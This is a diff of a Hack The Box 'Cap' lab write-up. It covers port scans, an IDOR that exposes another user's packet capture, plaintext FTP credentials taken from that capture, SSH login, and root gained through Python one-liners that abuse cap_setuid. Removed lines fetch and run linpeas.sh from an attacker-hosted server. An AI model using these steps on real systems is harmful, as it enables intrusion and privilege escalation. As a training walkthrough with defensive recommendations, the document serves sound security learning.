@@ -3,116 +3,253 @@
 **IP Address:** `10.10.10.245`  
 **OS:** Ubuntu 20.04  
 **Difficulty:** Easy  
-**Tags:** #FTP, #PCAP, #Wireshark, #SSH, #LinPEAS, #SUID, #Python
+**Tags:** #FTP, #PCAP, #Wireshark, #SSH, #LinPEAS, #SUID, #Python, #IDOR
 
 ---
-## 1. Port Scanning
+## Synopsis
 
-### 1.1 Nmap Scan
+Cap is an easy Linux machine running a web-based "Security Dashboard" that allows users to perform network captures.  
+An **Insecure Direct Object Reference (IDOR)** vulnerability grants access to another user's packet capture containing plaintext credentials.  
+These credentials are reused for SSH access.  
+Privilege escalation is achieved by abusing the `cap_setuid` Linux capability assigned to Python, allowing direct privilege switching to root.
+
+---
+## Skills Required
+
+- Basic web enumeration
+- Familiarity with Wireshark and PCAP analysis
+- Understanding of Linux capabilities
+
+## Skills Learned
+
+- Identifying and exploiting **IDOR** vulnerabilities
+- Analyzing packet captures for credentials
+- Leveraging Linux capabilities (`cap_setuid`) for privilege escalation
+
+---
+## 1. Initial Enumeration
+
+### 1.1 Connectivity Test
+
+Verify if the host is alive using ICMP:
 
 ```bash
-# Command
-nmap -sV -sC 10.10.10.245
+ping -c 1 10.10.10.245
 ```
 
-``` bash
-# Output
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-23 19:38 UTC
-Nmap scan report for 10.10.10.245
-Host is up (0.036s latency).
-Not shown: 997 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)                                                                        
-| ssh-hostkey:                                                                   
-|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)                   
-|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)                  
-|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
-80/tcp open  http    Gunicorn
-|_http-title: Security Dashboard
-|_http-server-header: gunicorn
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+![[GitHub Documentation/EASY/HTB_Cap_Writeup/screenshots/ping.png]]
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                      
-Nmap done: 1 IP address (1 host up) scanned in 10.75 seconds
+The host responds, confirming it is reachable.
+
+---
+### 1.2 Port Scanning
+
+Scan all TCP ports to identify running services:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.245 -oG allPorts
 ```
+
+- `-p-`: Scan all 65,535 ports  
+- `--open`: Show only open ports  
+- `-sS`: SYN scan  
+- `--min-rate 5000`: Increase speed  
+- `-Pn`: Skip host discovery (already confirmed alive)  
+- `-oG`: Output in grepable format
+
+![[GitHub Documentation/EASY/HTB_Cap_Writeup/screenshots/nmap.png]]
+
+Extract open ports from the result:
+
+```bash
+extractPorts allPorts
+```
+
+![[GitHub Documentation/EASY/HTB_Cap_Writeup/screenshots/extractPorts.png]]
+
+---
+### 1.3 Targeted Scan
+
+Run a deeper scan with service/version detection and default scripts:
+
+```bash
+nmap -sCV -p21,22,80 10.10.10.245 -oN targeted
+```
+
+- `-sC`: Run default NSE scripts  
+- `-sV`: Detect service versions  
+- `-oN`: Output in human-readable format  
+
+Let's check the result:
+
+```bash
+cat targeted -l java
+```
+
+![[GitHub Documentation/EASY/HTB_Cap_Writeup/screenshots/cat_targeted.png]]
+
+**Findings:**
+
+| Port | Service | Version                  |
+|------|---------|--------------------------|
+| 21   | FTP     | vsftpd (anonymous login disabled) |
+| 22   | SSH     | OpenSSH 8.x               |
+| 80   | HTTP    | Gunicorn Python WSGI server |
 
 ---
 ## 2. Web Enumeration
 
-Navigating to `http://10.10.10.245` opens a "Security Dashboard" already logged in as `Nathan`. 
+### 2.1 Dashboard Overview
 
-![Main Dashboard](website_with_lateral_menu.png)
+Browsing to `http://10.10.10.245`, after saving it into `/etc/hosts`, reveals a **Security Dashboard** already logged in as user `Nathan`.
 
-Clicking **Security Snapshot** changes the URL to `/capture/data/0`.
+![[GitHub Documentation/EASY/HTB_Cap_Writeup/screenshots/dashboard.png]]
 
-![Main Dashboard](dashboard_security_snapshot.png)
+Menu options include:
 
-```text
-/capture/data/0 → contains downloadable PCAP data
+![[GitHub Documentation/EASY/HTB_Cap_Writeup/screenshots/dashboard_left_menu.png]]
+
+- **IP Config** → Displays output of `ifconfig`  
+- **Network Status** → Displays output of `netstat`  
+- **Security Snapshot** → Generates a downloadable packet capture
+
+---
+### 2.2 Capture Analysis & IDOR Discovery
+
+When generating a capture, the URL changes to:
+
+```
+/capture/data/1
 ```
 
-⬇️ Downloaded the `.pcap` file and opened it with **Wireshark**.
+![[dashboard_data_1.png]]
 
-Filtered traffic by protocol **FTP** and discovered:
+This suggests the capture ID is sequential.  
+Testing `/capture/data/0` successfully downloads a previous capture.
 
-![Main Dashboard](wireshark.png)
+![[GitHub Documentation/EASY/HTB_Cap_Writeup/screenshots/dashboard_data_0.png]]
 
-```text
+> **Vulnerability:**  
+> This is an **Insecure Direct Object Reference (IDOR)** — direct access to objects by modifying identifiers in the request.
+
+---
+### 2.3 Credential Extraction from PCAP
+
+The capture file from `/capture/data/0` is downloaded, opened in **Wireshark** and filtered for FTP traffic:
+
+```
+ftp
+```
+
+![[GitHub Documentation/EASY/HTB_Cap_Writeup/screenshots/wireshark.png]]
+
+Captured credentials:
+
+```
 Username: nathan
 Password: Buck3tH4TF0RM3!
 ```
 
 ---
-## 3. SSH Access
+## 3. Foothold
 
-Used the recovered credentials:
+### 3.1 SSH Access
+
+Use the recovered credentials to log in via SSH:
 
 ```bash
 ssh nathan@10.10.10.245
 ```
 
-✅ SSH login successful  
+![[GitHub Documentation/EASY/HTB_Cap_Writeup/screenshots/user_flag.png]]
+
+✅ **SSH login successful**  
 🏁 **User flag retrieved from Nathan's home directory**
 
 ---
 ## 4. Privilege Escalation
 
-### 4.1 Hosting linPEAS Locally
+### 4.1 Checking SUID binaries
 
-Started a local web server:
-
-```bash
-python3 -m http.server 8080
-```
-
-On victim machine, downloaded **linpeas.sh**:
+After obtaining the user flag, we start privilege escalation by checking for SUID binaries owned by root:
 
 ```bash
-wget http://10.10.14.105:8080/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh
+find / -perm -4000 -user root 2>/dev/null | xargs ls -l
 ```
 
-![Main Dashboard](nathan_user.png)
+![[GitHub Documentation/EASY/HTB_Cap_Writeup/screenshots/root_permisions.png]]
+
+No exploitable SUID binaries are found.
 
 ---
-### 4.2 Root via Python SUID Abuse
+### 4.2 Checking capabilities
 
-`linpeas.sh` showed a possible misconfigured **SUID bit on Python3**.
+Next, we enumerate all file capabilities for user `nathan`:
 
-On the victim:
-
-```python
-import os
-os.setuid(0)
-os.system("/bin/bash")
+```bash
+getcap -r / 2>/dev/null
 ```
 
-![Main Dashboard](escalation.png)
+![[getcap_devnull.png]]
 
-✅ Spawned a root shell  
+Finding:
+
+```
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+ep
+```
+
+---
+### 4.3 Exploiting `cap_setuid`
+
+The `CAP_SETUID` capability allows a process to change its UID without needing the SUID bit.  
+
+First, verify that Python executes commands as our current user:
+
+```bash
+python3.8 -c 'import os; os.system("whoami")'
+```
+Output:
+```
+nathan
+```
+
+Then, change the UID to `0` (root) and check again:
+
+```bash
+python3.8 -c 'import os; os.setuid(0); os.system("whoami")'
+```
+Output:
+```
+root
+```
+
+Finally, spawn a root shell:
+
+```bash
+python3.8 -c 'import os; os.setuid(0); os.system("bash")'
+```
+
+![[setuid_0.png]]
+
 🏁 **Root flag retrieved from `/root`**
 
 ---
 # ✅ MACHINE COMPLETE
+
+---
+## Summary of Exploitation Path
+
+1. **Web Enumeration** → Discovered capture generation feature.  
+2. **IDOR** → Accessed another user’s PCAP file.  
+3. **PCAP Analysis** → Extracted plaintext FTP credentials.  
+4. **SSH Access** → Logged in as Nathan.  
+5. **Privilege Escalation** → Abused Python `cap_setuid` to gain root.
+
+---
+## Defensive Recommendations
+
+- Implement proper **access control** to prevent IDOR vulnerabilities.  
+- Avoid storing or transmitting credentials in plaintext (use FTPS/SFTP).  
+- Restrict Linux capabilities to only required binaries.  
+- Regularly audit server configurations for misconfigurations.
+
